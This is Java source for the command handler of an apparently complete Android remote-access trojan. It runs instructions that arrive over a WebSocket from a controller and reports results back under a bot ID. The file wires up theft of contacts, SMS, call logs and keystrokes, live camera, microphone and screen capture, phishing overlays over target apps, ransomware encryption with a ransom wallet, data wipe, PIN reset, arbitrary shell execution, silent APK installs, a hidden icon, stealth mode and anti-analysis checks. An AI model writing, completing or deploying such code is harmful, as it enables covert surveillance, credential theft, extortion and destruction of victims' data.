package com.xrc.system.network;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;

import com.xrc.system.core.ConfigManager;
import com.xrc.system.core.Constants;
import com.xrc.system.features.AntiAnalysis;
import com.xrc.system.features.AppManager;
import com.xrc.system.features.CameraManager;
import com.xrc.system.features.ClipboardManager;
import com.xrc.system.features.ContactHarvester;
import com.xrc.system.features.DeviceAdmin;
import com.xrc.system.features.FileManager;
import com.xrc.system.features.Keylogger;
import com.xrc.system.features.LocationTracker;
import com.xrc.system.features.MicManager;
import com.xrc.system.features.PermissionHelper;
import com.xrc.system.features.PhishletManager;
import com.xrc.system.features.Ransomware;
import com.xrc.system.features.SMSManager;
import com.xrc.system.features.ScreenLogger;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class CommandHandler {
    private static final String TAG = Constants.TAG + ":Cmd";
    private static CommandHandler instance;
    private final Context ctx;

    private CommandHandler(Context ctx) {
        this.ctx = ctx.getApplicationContext();
    }

    public static synchronized CommandHandler get(Context ctx) {
        if (instance == null) {
            instance = new CommandHandler(ctx);
        }
        return instance;
    }

    public void execute(JSONObject cmd) {
        try {
            String action = cmd.getString("cmd");
            JSONObject params = cmd.optJSONObject("params");
            if (params == null) params = new JSONObject();

            Log.i(TAG, "Executing: " + action);

            switch (action) {
                case "ping":
                    sendResponse("pong", new JSONObject());
                    break;
                case "get_info":
                    sendDeviceInfo();
                    break;
                case "get_location":
                    LocationTracker.get(ctx).fetchAndSend();
                    break;
                case "get_contacts":
                    ContactHarvester.get(ctx).harvestAndSend();
                    break;
                case "get_sms":
                    SMSManager.get(ctx).dumpAndSend(params.optInt("limit", 100));
                    break;
                case "get_calls":
                    SMSManager.get(ctx).dumpCallsAndSend(params.optInt("limit", 100));
                    break;
                case "get_clipboard":
                    ClipboardManager.get(ctx).readAndSend();
                    break;
                case "set_clipboard":
                    ClipboardManager.get(ctx).setText(params.optString("text", ""));
                    break;
                case "start_camera":
                    CameraManager.get(ctx).startStream(params.optString("camera", "back"));
                    break;
                case "stop_camera":
                    CameraManager.get(ctx).stopStream();
                    break;
                case "start_mic":
                    MicManager.get(ctx).startStream();
                    break;
                case "stop_mic":
                    MicManager.get(ctx).stopStream();
                    break;
                case "start_screen":
                    ScreenLogger.get(ctx).startCapture();
                    break;
                case "stop_screen":
                    ScreenLogger.get(ctx).stopCapture();
                    break;
                case "start_keylogger":
                    Keylogger.get(ctx).enable();
                    break;
                case "stop_keylogger":
                    Keylogger.get(ctx).disable();
                    break;
                case "get_keylogs":
                    Keylogger.get(ctx).dumpAndSend();
                    break;
                case "list_files":
                    FileManager.get(ctx).listDirectory(params.optString("path", "/"));
                    break;
                case "download_file":
                    FileManager.get(ctx).uploadFile(params.optString("path", ""));
                    break;
                case "upload_file":
                    FileManager.get(ctx).writeFile(params.optString("path", ""),
                            params.optString("data", ""));
                    break;
                case "delete_file":
                    FileManager.get(ctx).deleteFile(params.optString("path", ""));
                    break;
                case "install_apk":
                    FileManager.get(ctx).installApk(params.optString("path", ""));
                    break;
                case "uninstall_app":
                    AppManager.get(ctx).uninstallApp(params.optString("pkg", ""));
                    break;
                case "launch_app":
                    AppManager.get(ctx).launchApp(params.optString("pkg", ""));
                    break;
                case "launch_url":
                    launchUrl(params.optString("url", ""));
                    break;
                case "send_sms":
                    SMSManager.get(ctx).sendSMS(params.optString("to", ""),
                            params.optString("body", ""));
                    break;
                case "phishlet_show":
                    PhishletManager.get(ctx).showPhishlet(params.optString("id", ""),
                            params.optString("target_pkg", ""));
                    break;
                case "phishlet_hide":
                    PhishletManager.get(ctx).hidePhishlet();
                    break;
                case "ransomware_encrypt":
                    Ransomware.get(ctx).encryptDevice(params.optString("msg", ""),
                            params.optString("wallet", ""));
                    break;
                case "ransomware_decrypt":
                    Ransomware.get(ctx).decryptDevice();
                    break;
                case "wipe_data":
                    DeviceAdmin.get(ctx).wipeData();
                    break;
                case "lock_screen":
                    DeviceAdmin.get(ctx).lockScreen();
                    break;
                case "reset_pin":
                    DeviceAdmin.get(ctx).resetPassword(params.optString("pin", "0000"));
                    break;
                case "reboot":
                    reboot();
                    break;
                case "volume_up":
                    AppManager.get(ctx).setVolume(params.optInt("level", 100));
                    break;
                case "volume_mute":
                    AppManager.get(ctx).mute();
                    break;
                case "hide_icon":
                    AppManager.get(ctx).hideIcon();
                    break;
                case "show_icon":
                    AppManager.get(ctx).showIcon();
                    break;
                case "get_apps":
                    AppManager.get(ctx).listInstalled();
                    break;
                case "get_running":
                    AppManager.get(ctx).listRunning();
                    break;
                case "kill_app":
                    AppManager.get(ctx).killApp(params.optString("pkg", ""));
                    break;
                case "disable_play_protect":
                    // Handled automatically
                    break;
                case "screenshot":
                    ScreenLogger.get(ctx).takeScreenshot();
                    break;
                case "get_battery":
                    sendBatteryInfo();
                    break;
                case "vibrate":
                    AppManager.get(ctx).vibrate(params.optInt("ms", 500));
                    break;
                case "toast":
                    AppManager.get(ctx).showToast(params.optString("msg", ""));
                    break;
                case "shell":
                    AppManager.get(ctx).execShell(params.optString("cmd", ""));
                    break;
                case "update_config":
                    ConfigManager.get(ctx).applyRemoteConfig(params);
                    break;
                case "get_config":
                    sendResponse("config", ConfigManager.get(ctx).getDeviceConfig());
                    break;
                case "anti_analysis_check":
                    AntiAnalysis.get(ctx).runChecks();
                    break;
                case "stealth_mode":
                    stealthMode(params.optBoolean("enable", true));
                    break;
                default:
                    sendResponse("error", new JSONObject().put("msg", "Unknown command: " + action));
            }
        } catch (Exception e) {
            Log.e(TAG, "Command execution failed", e);
            try {
                sendResponse("error", new JSONObject().put("msg", e.getMessage()));
            } catch (JSONException ignored) {}
        }
    }

    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("bot_id", ConfigManager.get(ctx).getBotId());
            info.put("model", android.os.Build.MODEL);
            info.put("manufacturer", android.os.Build.MANUFACTURER);
            info.put("device", android.os.Build.DEVICE);
            info.put("product", android.os.Build.PRODUCT);
            info.put("board", android.os.Build.BOARD);
            info.put("hardware", android.os.Build.HARDWARE);
            info.put("android_version", android.os.Build.VERSION.RELEASE);
            info.put("sdk", android.os.Build.VERSION.SDK_INT);
            info.put("fingerprint", android.os.Build.FINGERPRINT);
            info.put("serial", android.os.Build.SERIAL);
            info.put("id", android.os.Build.ID);
            info.put("tags", android.os.Build.TAGS);
            info.put("type", android.os.Build.TYPE);
            info.put("user", android.os.Build.USER);
            info.put("host", android.os.Build.HOST);
            info.put("bootloader", android.os.Build.BOOTLOADER);
            info.put("radio", android.os.Build.getRadioVersion());
            info.put("display", android.os.Build.DISPLAY);
            info.put("time", android.os.Build.TIME);
            info.put("brand", android.os.Build.BRAND);
            sendResponse("device_info", info);
        } catch (JSONException e) {
            Log.e(TAG, "Device info failed", e);
        }
    }

    private void sendBatteryInfo() {
        try {
            android.content.IntentFilter filter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
            android.content.Intent battery = ctx.registerReceiver(null, filter);
            if (battery == null) return;
            int level = battery.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
            int scale = battery.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
            int status = battery.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
            int temp = battery.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, -1);
            int voltage = battery.getIntExtra(android.os.BatteryManager.EXTRA_VOLTAGE, -1);
            boolean ac = battery.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1) == android.os.BatteryManager.BATTERY_PLUGGED_AC;
            boolean usb = battery.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1) == android.os.BatteryManager.BATTERY_PLUGGED_USB;
            boolean wireless = battery.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1) == android.os.BatteryManager.BATTERY_PLUGGED_WIRELESS;

            JSONObject bat = new JSONObject();
            bat.put("level", (int) ((level / (float) scale) * 100));
            bat.put("status", status);
            bat.put("temperature", temp / 10.0f);
            bat.put("voltage", voltage);
            bat.put("ac", ac);
            bat.put("usb", usb);
            bat.put("wireless", wireless);
            sendResponse("battery", bat);
        } catch (Exception e) {
            Log.e(TAG, "Battery info failed", e);
        }
    }

    private void launchUrl(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "URL launch failed", e);
        }
    }

    private void reboot() {
        try {
            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                pm.reboot("xrc_reboot");
            }
        } catch (Exception e) {
            Log.e(TAG, "Reboot failed", e);
        }
    }

    private void stealthMode(boolean enable) {
        ConfigManager.get(ctx).setBoolean("stealth_mode", enable);
        if (enable) {
            AppManager.get(ctx).hideIcon();
        }
    }

    private void sendResponse(String type, JSONObject data) {
        WebSocketClient.get(ctx).sendEvent(type, data);
    }
}
